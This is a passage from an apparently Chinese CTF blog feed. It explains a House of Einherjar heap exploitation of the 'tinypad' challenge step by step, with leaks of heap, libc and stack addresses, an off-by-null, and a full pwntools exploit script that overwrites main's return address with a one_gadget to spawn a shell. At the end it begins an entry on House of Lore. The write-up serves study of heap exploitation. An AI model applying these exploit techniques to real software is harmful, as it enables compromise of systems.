class="hljs-symbol">:sh</span>.recvuntil(delims)<br>itr     = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:sh</span>.interactive()<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-built_in">lambda</span> name,addr          <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = <span class="hljs-built_in">lambda</span> address,data       <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'%s: '</span><span class="hljs-string">%(address)</span>+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">'a'</span></span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'a'</span>)<br>    sla(<span class="hljs-string">'(SIZE)&gt;&gt;&gt; '</span>,str(size))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'e'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br>    sla(<span class="hljs-string">'Is it OK?\n'</span>,<span class="hljs-string">'Y'</span>)<br>   <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'d'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'Q'</span>)<br></code></pre></td></tr></tbody></table></figure><p>先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'INDEX: 1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'CONTENT: '</span>)</span></span><br>heapbase = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\n'</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">'\x00'</span>)) <span class="hljs-built_in">-</span>(<span class="hljs-number">0</span>x100+<span class="hljs-number">0</span>x10)*<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'INDEX: 3'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'CONTENT: '</span>)</span></span><br>libcbase = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\n'</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x3C4B78<br>environ = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'environ'</span>]</span>+libcbase<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heapbase'</span>,heapbase)</span></span><br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libcbase'</span>,libcbase)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br>#四个chunk与<span class="hljs-attribute">top</span> chunk合并<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><span class="hljs-selector-id">#empty</span> now <br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x100)</span></span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+p64(<span class="hljs-number">0</span>)</span></span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x41)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x602070)*<span class="hljs-number">2</span>+b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x20+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40))<br><br><span class="hljs-selector-id">#dbg</span>()<br><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x10)</span></span> #<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>xf0)</span></span> #<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x10)</span></span> #<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x100,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x100)</span></span> #<span class="hljs-number">4</span><br></code></pre></td></tr></tbody></table></figure><p>之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-id">#edit</span>(<span class="hljs-number">1</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x41)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x602070)*<span class="hljs-number">2</span>+b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x20+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40))<br><br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>target = heapbase+<span class="hljs-number">0</span>x20-<span class="hljs-number">0</span>x602070<br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x10+p64(target)</span></span>) #<span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">4</span>,b<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x30+p64(<span class="hljs-number">0</span>)</span></span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x101)+<span class="hljs-built_in">p64</span>(main_arena_88)*<span class="hljs-number">2</span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>xf0,<span class="hljs-keyword">b</span><span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>xc0+p64(<span class="hljs-number">0</span>x100)+p64(environ)+p64(<span class="hljs-number">0</span>x100)+p64(<span class="hljs-number">0</span>x602148))<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">'INDEX: 1'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">'CONTENT: '</span>)<br>stack= u64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">'\n'</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">'\x00'</span>))<br>target =  -<span class="hljs-number">0</span>xF0 + stack <br><span class="hljs-keyword">lg</span>(<span class="hljs-string">'stack'</span>,stack)<br><span class="hljs-keyword">lg</span>(<span class="hljs-string">'target'</span>,target)<br>#<span class="hljs-number">0</span>x7fc7dd85ff38 <span class="hljs-symbol">&lt;environ&gt;</span>:<span class="hljs-number">0</span>x00007ffc91b85d58<span class="hljs-number">0</span>x0000000000000000<br>#<span class="hljs-number">1</span><span class="hljs-keyword">e</span>:<span class="hljs-number">00</span>f0│       <span class="hljs-number">0</span>x7ffc91b85c68 —▸ <span class="hljs-number">0</span>x7fc7dd4b9830 (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br>#  <span class="hljs-number">0</span>x7ffc91b85c68-<span class="hljs-number">0</span>x00007ffc91b85d58=-<span class="hljs-number">0</span>xF0<br>dbg()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><p>泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack<br class='item-img' data-src='https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\x00”)，再退出程序，获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,p64(target)</span></span>)<br>one_gadget = <span class="hljs-selector-attr">[0x45216,0x4526a,0xf02a4,0xf1147]</span><br>shell = one_gadget<span class="hljs-selector-attr">[0]</span> + libcbase<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>,p64(shell)</span></span>)<br><span class="hljs-function"><span class="hljs-title">exit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,<span class="hljs-built_in">debug</span><br>sh = process(<span class="hljs-string">'./tinypad'</span>)<br>libc = ELF(<span class="hljs-string">'/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so'</span>)<br><br><span class="hljs-comment">#命令简写化</span><br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims             :sh.recvuntil(delims)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br><br>def <span class="hljs-built_in">add</span>(size, <span class="hljs-attribute">content</span>=<span class="hljs-string">'a'</span>):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'a'</span>)<br>    sla(<span class="hljs-string">'(SIZE)&gt;&gt;&gt; '</span>,str(size))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br><br><br><br>def <span class="hljs-built_in">edit</span>(idx, content):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'e'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br>    sla(<span class="hljs-string">'(CONTENT)&gt;&gt;&gt; '</span>,content)<br>    sla(<span class="hljs-string">'Is it OK?\n'</span>,<span class="hljs-string">'Y'</span>)<br>   <br><br><br>def free(idx):<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'d'</span>)<br>    sla(<span class="hljs-string">'(INDEX)&gt;&gt;&gt; '</span>,str(idx))<br><br>def exit():<br>    sla(<span class="hljs-string">'(CMD)&gt;&gt;&gt; '</span>,<span class="hljs-string">'Q'</span>)<br> <br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><br>free(3)<br>free(1)<br>ru(<span class="hljs-string">'INDEX: 1'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>heapbase = u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>)) -(0x100+0x10)<span class="hljs-number">*2</span><br>ru(<span class="hljs-string">'INDEX: 3'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>main_arena_88 = u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>)) <br>libcbase = main_arena_88-0x3C4B78<br>environ = libc.sym[<span class="hljs-string">'environ'</span>]+libcbase<br>lg(<span class="hljs-string">'heapbase'</span>,heapbase)<br>lg(<span class="hljs-string">'libcbase'</span>,libcbase)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(0x100)<br><span class="hljs-built_in">add</span>(0x100)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#四个chunk与top chunk合并</span><br>free(4)<br>free(1)<br>free(2)<br>free(3)<br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#empty now </span><br><br><span class="hljs-built_in">add</span>(0x100,<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x100)<br><span class="hljs-built_in">edit</span>(1,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x30+p64(0)+p64(0x41)+p64(0x602070)<span class="hljs-number">*2</span>+b<span class="hljs-string">'\x00'</span><span class="hljs-number">*0</span>x20+p64(0x40))<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br><br><span class="hljs-built_in">add</span>(0x10) #1<br><span class="hljs-built_in">add</span>(0xf0) #2<br><span class="hljs-built_in">add</span>(0x10) #3<br><span class="hljs-built_in">add</span>(0x100,<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x100) #4<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br><br><span class="hljs-comment">#dbg()</span><br><br>target = heapbase+0x20-0x602070<br><span class="hljs-built_in">add</span>(0x18,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x10+p64(target)) #1<br><br><br>free(2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">edit</span>(4,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>x30+p64(0)+p64(0x101)+p64(main_arena_88)<span class="hljs-number">*2</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(0xf0,b<span class="hljs-string">'a'</span><span class="hljs-number">*0</span>xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))<br>ru(<span class="hljs-string">'INDEX: 1'</span>)<br>ru(<span class="hljs-string">'CONTENT: '</span>)<br>stack= u64(ru(<span class="hljs-string">'\n'</span>)[:-1].ljust(8,b<span class="hljs-string">'\x00'</span>))<br>target =  -0xF0 + stack <br>lg(<span class="hljs-string">'stack'</span>,stack)<br>lg(<span class="hljs-string">'target'</span>,target)<br><span class="hljs-comment">#0x7f825ab56f38 &lt;environ&gt;:0x00007ffe282d8c280x0000000000000000</span><br><span class="hljs-comment">#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="hljs-comment">#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0</span><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">edit</span>(2,p64(target))<br>one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]<br>shell = one_gadget[0] + libcbase<br><span class="hljs-built_in">edit</span>(1,p64(shell))<br>exit()<br> <br>itr()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;House of Einherjar&lt;/h1&gt;
&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;
&lt;p&gt;释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Stashing Unlink Attack（House of Lore）</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Lore/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Lore/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-10-29T11:58:45.243Z</updated>
    
    <content type="html"><![CDATA[<p>如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：</p><p><strong>Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin</strong></p><h1>House of Lore</h1><blockquote><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。<br>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。<br>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p></blockquote><h1>Tcache Stashing Unlink Attack</h1><blockquote><p>利用特性：<br>1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中<br>2.calloc函数分配堆块时不从tcache bin中选取。<br>3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写</p></blockquote><p>利用前提</p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.能控制 Small <span class="hljs-keyword">Bin </span>Chunk 的 <span class="hljs-keyword">bk </span>指针。<br><br><span class="hljs-number">2</span>.程序可以越过Tache取Chunk。(使用calloc即可做到)<br><br><span class="hljs-number">3</span>.程序至少可以分配两种不同大小且大小为unsorted <span class="hljs-keyword">bin的Chunk。</span><br></code></pre></td></tr></tbody></table></figure><h4 id="攻击目标"><a href="#攻击目标" 